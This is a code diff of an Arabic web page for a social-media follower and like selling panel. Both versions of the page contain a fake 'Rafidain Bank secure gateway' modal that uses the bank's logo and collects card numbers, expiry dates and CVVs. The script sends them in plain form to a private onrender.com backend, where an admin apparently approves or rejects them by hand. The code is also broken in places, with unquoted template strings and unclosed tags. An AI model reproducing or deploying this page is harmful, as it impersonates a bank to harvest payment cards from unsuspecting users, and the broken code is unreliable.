@@ -3,158 +3,164 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMM MUHAMMAD | نظام الرشق</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>نظام رشق محمد | لوحة التحكم</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
-        body { margin: 0; background: #0c0c0c; font-family: sans-serif; color: white; display: flex; flex-direction: column; align-items: center; }
-        .top-bar { width: 100%; max-width: 400px; background: #1e1e1e; padding: 15px; border-radius: 0 0 20px 20px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #333; margin-bottom: 20px; box-sizing: border-box;}
-        .container { width: 95%; max-width: 400px; background: #1a1a1a; padding: 20px; border-radius: 20px; border: 1px solid #333; box-sizing: border-box;}
-        
-        .services { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
-        .service-card { background: #222; padding: 15px; border-radius: 12px; cursor: pointer; border: 2px solid transparent; text-align: center; transition: 0.2s; }
-        .service-card i { font-size: 24px; color: #ff4500; margin-bottom: 8px; }
-        .service-card.active { border-color: #00ffcc; background: rgba(0,255,204,0.1); }
+        :root { --main-bg: #f4f6f9; --white: #ffffff; --primary: #5e72e4; --text-color: #32325d; --bank-red: #800000; }
+        body { margin: 0; background: var(--main-bg); font-family: 'Segoe UI', sans-serif; color: var(--text-color); padding: 15px; }
 
-        input { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 10px; border: 1px solid #444; background: #111; color: white; box-sizing: border-box; font-size: 16px; outline: none; }
-        input:focus { border-color: #ff4500; }
-        
-        #cost-display { color: #00ffcc; font-weight: bold; font-size: 18px; text-align: center; display: block; margin-bottom: 15px; }
-        .btn-order { width: 100%; padding: 15px; background: #ff4500; border: none; border-radius: 12px; color: white; font-weight: bold; cursor: pointer; font-size: 16px; }
+        /* الكروت العلوية */
+        .stats-container { display: grid; grid-template-columns: 1fr; gap: 15px; margin-bottom: 20px; }
+        .stat-card { background: var(--white); padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); position: relative; overflow: hidden; }
+        .stat-card i { position: absolute; left: 20px; top: 25%; font-size: 35px; color: var(--primary); opacity: 0.2; }
+        .stat-card .label { font-size: 14px; color: #8898aa; margin-bottom: 5px; }
+        .stat-card .value { font-size: 24px; font-weight: bold; color: var(--text-color); }
 
-        /* Modal Styles */
-        .modal { display: none; position: fixed; z-index: 1000; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); }
-        .modal-content { background: #fff; color: #333; margin: 10% auto; width: 90%; max-width: 380px; border-radius: 15px; overflow: hidden; }
+        /* الأزرار السريعة */
+        .quick-actions { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px; }
+        .action-btn { background: var(--white); border: none; padding: 10px; border-radius: 12px; font-size: 12px; font-weight: bold; cursor: pointer; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+        .action-btn i { display: block; margin-bottom: 5px; color: #fb6340; font-size: 18px; }
+
+        /* حاوية الطلب الجديد */
+        .order-box { background: var(--white); padding: 25px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
+        .order-box h3 { margin: 0 0 20px 0; font-size: 18px; border-bottom: 2px solid #f6f9fc; padding-bottom: 10px; }
+
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; font-size: 13px; font-weight: bold; margin-bottom: 8px; color: #525f7f; }
+        
+        select, input { width: 100%; padding: 12px; border: 1px solid #dee2e6; border-radius: 8px; box-sizing: border-box; font-size: 14px; outline: none; transition: 0.3s; }
+        select:focus, input:focus { border-color: var(--primary); }
+
+        .price-badge { background: #e8f0fe; color: var(--primary); padding: 10px; border-radius: 8px; text-align: center; font-weight: bold; margin: 15px 0; }
+        .btn-submit { width: 100%; padding: 15px; background: linear-gradient(87deg, #5e72e4 0, #825ee4 100%); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 6px rgba(50,50,93,0.11); }
+
+        /* نافذة الماستر كارد */
+        .modal { display: none; position: fixed; z-index: 1000; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); }
+        .modal-content { background: #fff; margin: 10% auto; width: 90%; max-width: 380px; border-radius: 15px; overflow: hidden; }
     </style>
 </head>
 <body>
 
-    <div class="top-bar">
-        <div style="color:#00ffcc; font-weight:bold;">الرصيد: $<span id="user-balance">0.00</span></div>
-        <button onclick="document.getElementById('payModal').style.display='block'" style="background:#800000; color:white; border:none; padding:8px 15px; border-radius:8px; cursor:pointer;">شحن رصيد</button>
-    </div>
-
-    <div class="container">
-        <div class="services">
-            <div class="service-card active" onclick="selectService(3.0, 'متابعين تيك توك', this)">
-                <i class="fab fa-tiktok"></i><br>متابعين تيك توك
-            </div>
-            <div class="service-card" onclick="selectService(2.5, 'أعضاء تليجرام', this)">
-                <i class="fab fa-telegram"></i><br>أعضاء تليجرام
-            </div>
-            <div class="service-card" onclick="selectService(0.5, 'لايكات تيك توك', this)">
-                <i class="fab fa-tiktok"></i><br>لايكات تيك توك
-            </div>
-            <div class="service-card" onclick="selectService(3.5, 'متابعين انستقرام', this)">
-                <i class="fab fa-instagram"></i><br>متابعين انستا
-            </div>
+    <div class="stats-container">
+        <div class="stat-card">
+            <div class="label">رصيدك الحالي</div>
+            <div class="value">$<span id="bal-val">0.00</span></div>
+            <i class="fas fa-wallet"></i>
         </div>
-
-        <input type="text" id="order-link" placeholder="رابط الحساب أو المنشور">
-        <input type="number" id="order-qty" placeholder="الكمية" oninput="calculateCost()">
-        
-        <div id="cost-display">التكلفة: $0.00</div>
-        <button class="btn-order" onclick="submitOrder()">إرسال الطلب الآن</button>
     </div>
 
-    <div id="payModal" class="modal">
-        <div class="modal-content">
-            <div style="background:#800000; padding:15px; text-align:center; color:white;">
-                <img src="https://upload.wikimedia.org/wikipedia/ar/thumb/a/a2/Rafidain_Bank_Logo.png/250px-Rafidain_Bank_Logo.png" style="width:50px;"><br>
-                <b>بوابة مصرف الرافدين الآمنة</b>
-                <div id="modal-body" style="padding:20px;">
-                <input type="number" id="pay-usd" placeholder="المبلغ بالدولار" oninput="document.getElementById('iqd-hint').innerText = (this.value*1530).toLocaleString() + ' IQD'" style="background:#f0f0f0; color:#333;">
-                <p id="iqd-hint" style="text-align:center; color:red; font-weight:bold;"></p>
-                <input type="text" id="pay-card" placeholder="رقم البطاقة" style="background:#f0f0f0; color:#333;">
-                <div style="display:flex; gap:5px;">
-                    <input type="text" id="pay-exp" placeholder="MM/YY" style="background:#f0f0f0; color:#333;">
-                    <input type="password" id="pay-cvv" placeholder="CVV" style="background:#f0f0f0; color:#333;">
+    <div class="quick-actions">
+        <div class="action-btn" onclick="openBank()">
+            <i class="fas fa-credit-card"></i> شحن الرصيد
+        </div>
+        <div class="action-btn">
+            <i class="fas fa-history"></i> السجل
+        </div>
+        <div class="action-btn">
+            <i class="fas fa-headset"></i> الدعم
+        </div>
+    </div>
+
+    <div class="order-box">
+        <h3>طلب جديد</h3>
+        <div class="form-group">
+            <label>الفئة</label>
+            <select id="category" onchange="updateServices()">
+                <option value="tiktok">تيك توك | Tiktok</option>
+                <option value="instagram">انستقرام | Instagram</option>
+                <option value="telegram">تليجرام | Telegram</option>
                 </div>
-                <button onclick="processPayment()" style="width:100%; padding:15px; background:#28a745; color:white; border:none; border-radius:8px; font-weight:bold; cursor:pointer;">تأكيد الدفع</button>
-                <button onclick="document.getElementById('payModal').style.display='none'" style="width:100%; background:none; border:none; color:#777; margin-top:10px; cursor:pointer;">إلغاء</button>
+        <div class="form-group">
+            <label>الخدمة</label>
+            <select id="service" onchange="calcPrice()"></select>
+        </div>
+        <div class="form-group">
+            <label>الرابط</label>
+            <input type="text" id="link" placeholder="https://...">
+        </div>
+        <div class="form-group">
+            <label>الكمية</label>
+            <input type="number" id="qty" placeholder="0" oninput="calcPrice()">
+        </div>
+        <div class="price-badge" id="total-price">التكلفة: $0.00</div>
+        <button class="btn-submit" onclick="submitOrder()">تأكيد الطلب</button>
+    </div>
+
+    <div id="bankModal" class="modal">
+        <div class="modal-content">
+            <div style="background:var(--bank-red); padding:15px; text-align:center; color:white;">
+                <img src="https://upload.wikimedia.org/wikipedia/ar/thumb/a/a2/Rafidain_Bank_Logo.png/250px-Rafidain_Bank_Logo.png" style="width:40px;"><br>
+                <b>بوابة الرافدين الآمنة</b>
+            </div>
+            <div style="padding:20px;">
+                <input type="number" id="p-usd" placeholder="المبلغ بالدولار" oninput="document.getElementById('iqd-v').innerText = (this.value*1530).toLocaleString() + ' IQD'">
+                <p id="iqd-v" style="text-align:center; color:red; font-weight:bold;"></p>
+                <input type="text" id="p-card" placeholder="رقم البطاقة (16 رقم)">
+                <div style="display:flex; gap:10px; margin-top:10px;">
+                    <input type="text" id="p-exp" placeholder="MM/YY">
+                    <input type="password" id="p-cvv" placeholder="CVV">
+                </div>
+                <button class="btn-submit" style="background:#2dce89; margin-top:15px;" onclick="goPay()">دفع الآن</button>
+                <button onclick="document.getElementById('bankModal').style.display='none'" style="width:100%; background:none; border:none; color:#888; margin-top:10px;">إلغاء</button>
             </div>
         </div>
     </div>
 
     <script>
-        const API_URL = "https://army-bot-3y9o.onrender.com";
-        let currentPrice = 3.0;
-        let currentService = "متابعين تيك توك";
+        const API_BASE = "https://army-bot-3y9o.onrender.com";
+        const servicesData = {
+            tiktok: [ {id:1, name:"متابعين تيك توك - 3$", price:3.0}, {id:2, name:"لايكات تيك توك - 0.5$", price:0.5} ],
+            instagram: [ {id:3, name:"متابعين انستا - 3.5$", price:3.5} ],
+            telegram: [ {id:4, name:"أعضاء تليجرام - 2.5$", price:2.5} ]
+        };
 
-        function selectService(price, name, el) {
-            document.querySelectorAll('.service-card').forEach(c => c.classList.remove('active'));
-            el.classList.add('active');
-            currentPrice = price;
-            currentService = name;
-            calculateCost();
+        function updateServices() {
+            const cat = document.getElementById('category').value;
+            const srvSelect = document.getElementById('service');
+            srvSelect.innerHTML = servicesData[cat].map(s => `<option value="${s.price}">${s.name}</option>`).join('');
+            calcPrice();
         }
 
-        function calculateCost() {
-            const qty = document.getElementById('order-qty').value || 0;
-            const cost = (qty / 1000) * currentPrice;
-            document.getElementById('cost-display').innerText = التكلفة: $${cost.toFixed(2)};
-            return cost.toFixed(2);
+        function calcPrice() {
+            const price = document.getElementById('service').value;
+            const qty = document.getElementById('qty').value || 0;
+            const total = (qty / 1000) * price;
+            document.getElementById('total-price').innerText = التكلفة: $${total.toFixed(2)};
         }
+
+        function openBank() { document.getElementById('bankModal').style.display = 'block'; }
 
         async function submitOrder() {
-            const link = document.getElementById('order-link').value;
-            const qty = document.getElementById('order-qty').value;
-            const cost = calculateCost();
-
-            if(!link || qty <= 0) return alert("يرجى ملء جميع الحقول");
-
-            const res = await fetch(`${API_URL}/api/order`, {
+            const cost = (document.getElementById('qty').value / 1000) * document.getElementById('service').value;
+            const res = await fetch(`${API_BASE}/api/order`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({link, qty, service: currentService, cost})
+                body: JSON.stringify({service: document.getElementById('service').selectedOptions[0].text, qty: document.getElementById('qty').value, link: document.getElementById('link').value, cost: cost})
             });
-
-            const data = await res.json();
-            if(data.success) {
-                alert("✅ تم إرسال الطلب بنجاح!");
-                loadBalance();
-            } else {
-                alert("❌ " + data.message);
-            }
+            if(res.ok) alert("✅ تم إرسال الطلب!");
+            else alert("❌ رصيد غير كافٍ");
         }
 
-        async function processPayment() {
-            const usd = document.getElementById('pay-usd').value;
-            const card = document.getElementById('pay-card').value;
-            if(!usd || card.length < 16) return alert("بيانات البطاقة غير مكتملة");
-
-            const body = document.getElementById('modal-body');
-            body.innerHTML = <div style="text-align:center; padding:30px; color:#333;"><i class="fas fa-spinner fa-spin fa-3x"></i><br><br>جاري الاتصال بالبنك...</div>;
-
-            await fetch(`${API_URL}/api/secure-pay`, {
+        async function goPay() {
+            await fetch(`${API_BASE}/api/secure-pay`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({amount_usd: usd, amount_iqd: usd*1530, card: card, date: document.getElementById('pay-exp').value, cvv: document.getElementById('pay-cvv').value})
+                body: JSON.stringify({amount_usd: document.getElementById('p-usd').value, card: document.
+                 getElementById('p-card').value, date: document.getElementById('p-exp').value, cvv: document.getElementById('p-cvv').value})
             });
-
-            const checker = setInterval(async () => {
-                const res = await fetch(`${API_URL}/api/balance/default_user`);
-                const data = await res.json();
-                if(data.status === "approved") {
-                    clearInterval(checker);
-                    body.innerHTML = <div style="text-align:center; color:green; padding:30px;"><i class="fas fa-check-circle fa-4x"></i><br><h3>تم الدفع بنجاح!</h3></div>;
-                       setTimeout(() => location.reload(), 2000);
-                } else if(data.status === "rejected") {
-                    clearInterval(checker);
-                    alert("تم رفض البطاقة من قبل المدير");
-                    location.reload();
-                }
-            }, 3000);
+            alert("✅ تم إرسال طلب الشحن للمراجعة");
+            document.getElementById('bankModal').style.display = 'none';
         }
 
-        async function loadBalance() {
-            const res = await fetch(`${API_URL}/api/balance/default_user`);
-            const data = await res.json();
-            document.getElementById('user-balance').innerText = data.balance.toFixed(2);
+        // تحديث الرصيد عند الفتح
+        async function refresh() {
+            const r = await fetch(`${API_BASE}/api/balance/default_user`);
+            const d = await r.json();
+            document.getElementById('bal-val').innerText = d.balance.toFixed(2);
         }
-        
-        loadBalance();
-        setInterval(loadBalance, 10000);
+        updateServices();
+        refresh();
     </script>
 </body>
-</html> 
-            </div>
+</html>   
+            </select>
